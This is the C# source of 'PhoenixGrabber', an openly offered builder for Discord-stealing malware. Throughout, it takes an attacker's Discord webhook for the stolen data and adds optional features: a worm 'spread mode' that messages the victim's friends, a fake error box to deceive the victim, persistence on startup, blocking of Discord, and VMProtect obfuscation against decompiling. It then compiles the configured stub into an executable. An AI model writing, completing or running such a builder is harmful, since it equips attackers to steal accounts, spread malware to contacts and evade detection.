using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;

/* 
       │ Author       : extatent
       │ Name         : PhoenixGrabber
       │ GitHub       : https://github.com/extatent
*/

namespace PhoenixGrabber
{
    class Program
    {
        #region Configuration
        static string Webhook;
        static bool SpreadMode = false;
        static string WormMessage;
        static bool FakeError = false;
        static string FakeErrorMessage;
        static bool RunOnStartup = false;
        static bool BlockDiscord = false;
        static bool Obfuscate = false;
        static string FileName;
        #endregion

        #region Main
        static void Main()
        {
            using (var stream = new FileStream(Path.GetTempPath() + "\\BouncyCastle.Crypto.dll", FileMode.Create, FileAccess.Write))
                stream.Write(Properties.Resources.BouncyCastle_Crypto, 0, Properties.Resources.BouncyCastle_Crypto.Length);
            Console.Title = "Phoenix Grabber";
            Console.Clear();
            Console.Write("Discord Webhook: ");
            Webhook = Console.ReadLine();
            if (string.IsNullOrEmpty(Webhook)) Main();
            Console.Clear();
            Console.WriteLine("Sends your message to all friends.\n");
            Console.Write("Spread Mode (Y/N): ");
            if (Console.ReadLine().ToLower() == "y")
            {
                SpreadMode = true;
                Console.Clear();
                Console.WriteLine("Enter the message you want the user to spread (the message can include invite links, download urls and so on).\n");
                Console.Write("Message: ");
                WormMessage = Console.ReadLine();
            }
            Console.Clear();
            Console.WriteLine("Shows a fake error after opening the program.\n");
            Console.Write("Fake Error (Y/N): ");
            if (Console.ReadLine().ToLower() == "y")
            {
                FakeError = true;
                Console.Clear();
                Console.WriteLine("Enter the fake error message.\n");
                Console.Write("Message: ");
                FakeErrorMessage = Console.ReadLine();
            }
            Console.Clear();
            Console.WriteLine("Runs the program once the computer is started.\n");
            Console.Write("Run On Startup: (Y/N): ");
            if (Console.ReadLine().ToLower() == "y")
            {
                RunOnStartup = true;
            }
            Console.Clear();
            Console.WriteLine("Prevents user from opening Discord in browser/app.\n");
            Console.Write("Block Discord: (Y/N): ");
            if (Console.ReadLine().ToLower() == "y")
            {
                BlockDiscord = true;
            }
            Console.Clear();
            Console.WriteLine("Protects the file from being decompiled.\n");
            Console.Write("Obfuscate: (Y/N): ");
            if (Console.ReadLine().ToLower() == "y")
            {
                Obfuscate = true;
            }
            Console.Clear();
            Console.Write("File Name: ");
            FileName = Console.ReadLine();
            if (string.IsNullOrEmpty(FileName)) FileName = "stub";
            Console.Clear();
            Console.WriteLine("Building stub");
            Compile();
            Console.ReadKey();
        }
        #endregion

        #region Base
        static string Base(string stub)
        {
            stub = stub.Replace("//Webhook", Webhook);

            if (SpreadMode == true)
                stub = stub.Replace("//SpreadMode", $"SpreadMode(\"{WormMessage}\");");

            if (FakeError == true)
                stub = stub.Replace("//FakeError", $"MessageBox.Show(\"{FakeErrorMessage}\", \"Error\", MessageBoxButtons.OKCancel, MessageBoxIcon.Error);");

            if (RunOnStartup == true)
                stub = stub.Replace("//RunOnStartup", "RunOnStartup();");

            if (BlockDiscord == true)
                stub = stub.Replace("//BlockDiscord", "BlockDiscord();");

            return stub;
        }
        #endregion

        #region Compile
        static void Compile()
        {
            string stub = Properties.Resources.Stub;
            stub = Base(stub);
            List<string> code = new List<string>
            {
                stub
            };
            CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");
            CompilerParameters compars = new CompilerParameters();
            compars.ReferencedAssemblies.Add("System.dll");
            compars.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            compars.ReferencedAssemblies.Add("System.Core.dll");
            compars.ReferencedAssemblies.Add("Microsoft.CSharp.dll");
            compars.ReferencedAssemblies.Add("System.Web.Extensions.dll");
            compars.ReferencedAssemblies.Add("System.Security.dll");
            compars.EmbeddedResources.Add(Path.GetTempPath() + "\\BouncyCastle.Crypto.dll");
            compars.ReferencedAssemblies.Add(Path.GetTempPath() + "\\BouncyCastle.Crypto.dll");
            compars.GenerateExecutable = true;
            compars.GenerateInMemory = false;
            compars.TreatWarningsAsErrors = false;
            compars.CompilerOptions += "/t:winexe /unsafe /platform:x86";
            if (Obfuscate == true)
            {
                if (FileName.Contains(" ")) { FileName = FileName.Replace(" ", "_"); }
                compars.OutputAssembly = Path.GetTempPath() + $"\\{FileName}.exe";
            }
            else
                compars.OutputAssembly = Directory.GetCurrentDirectory() + $"\\{FileName}.exe";
            CompilerResults res = provider.CompileAssemblyFromSource(compars, code.ToArray());
            Console.Clear();
            if (res.Errors.Count > 0)
            {
                foreach (CompilerError error in res.Errors)
                    Console.WriteLine(error);
            }
            else
            {
                if (Obfuscate == true)
                {
                    try
                    {
                        Console.WriteLine("Obfuscating");

                        using (var stream = new FileStream(Path.GetTempPath() + "\\VMProtect_Con.exe", FileMode.Create, FileAccess.Write))
                            stream.Write(Properties.Resources.VMProtect_Con, 0, Properties.Resources.VMProtect_Con.Length);

                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.WorkingDirectory = Path.GetTempPath();
                        p.StartInfo.Arguments = $"/C VMProtect_Con {Path.GetTempPath() + $"\\{FileName}.exe"} {Directory.GetCurrentDirectory() + $"\\{FileName}.exe"}";
                        p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        p.Start();
                        p.WaitForExit();

                        if (File.Exists(Path.GetTempPath() + "\\VMProtect_Con.exe")) { File.Delete(Path.GetTempPath() + "\\VMProtect_Con.exe"); }
                        if (File.Exists(Path.GetTempPath() + $"\\{FileName}.exe")) { File.Delete(Path.GetTempPath() + $"\\{FileName}.exe"); }
                    }
                    catch (Exception e)
                    {
                        Console.Clear();
                        Console.WriteLine(e.Message);
                    }
                }
                if (File.Exists(Path.GetTempPath() + "\\BouncyCastle.Crypto.dll")) { File.Delete(Path.GetTempPath() + "\\BouncyCastle.Crypto.dll"); }
                Console.Clear();
                Console.WriteLine($"File saved to: {Directory.GetCurrentDirectory() + $"\\{FileName}.exe"}\nPress any key to exit.");
                Console.ReadKey();
                Environment.Exit(0);
            }
        }
        #endregion
    }
}
